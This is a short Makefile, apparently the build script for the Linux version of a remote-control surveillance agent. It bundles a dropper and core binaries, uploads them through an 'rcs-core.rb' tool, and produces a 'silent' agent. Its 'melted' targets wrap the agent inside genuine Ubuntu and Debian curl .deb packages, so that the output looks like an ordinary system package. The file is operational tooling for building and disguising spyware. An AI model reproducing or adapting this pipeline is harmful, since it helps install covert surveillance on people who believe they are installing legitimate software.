all:
	# core | upload | silent | melted32 | melted64 #

.PHONY : core
core:
	cp ../VERSION core/version; rm -f linux.zip; cd core/; zip ../linux.zip version dropper core32 core64 bin/*.exe bin/*.dll;

.PHONY : upload
upload: core
	./script/rcs-core.rb -n linux -R linux.zip && rm linux.zip

.PHONY : silent
silent:
	./script/rcs-core.rb -n linux -f RCS_0000001449 -b script/params.json -o agent.zip && unzip agent.zip && rm agent.zip

.PHONY : ubuntumelted32
ubuntumelted32:
	./script/rcs-core.rb -n linux -f RCS_0000001449 -b script/params.json -i script/curl_7.22.0-3ubuntu4.1_i386.deb -o agent.zip && unzip agent.zip && mv agent.deb agent32.deb && rm agent.zip

.PHONY : ubuntumelted64
ubuntumelted64:
	./script/rcs-core.rb -n linux -f RCS_0000001449 -b script/params.json -i script/curl_7.29.0-1ubuntu3_amd64.deb -o agent.zip && unzip agent.zip && mv agent.deb agent64.deb && rm agent.zip

.PHONY : debianmelted32
debianmelted32:
	./script/rcs-core.rb -n linux -f RCS_0000001449 -b script/params.json -i script/curl_7.26.0-1+wheezy2_i386.deb -o agent.zip && unzip agent.zip && mv agent.deb agent32.deb && rm agent.zip

.PHONY : debianmelted64
debianmelted64:
	./script/rcs-core.rb -n linux -f RCS_0000001449 -b script/params.json -i script/curl_7.26.0-1+wheezy2_amd64.deb -o agent.zip && unzip agent.zip && mv agent.deb agent64.deb && rm agent.zip
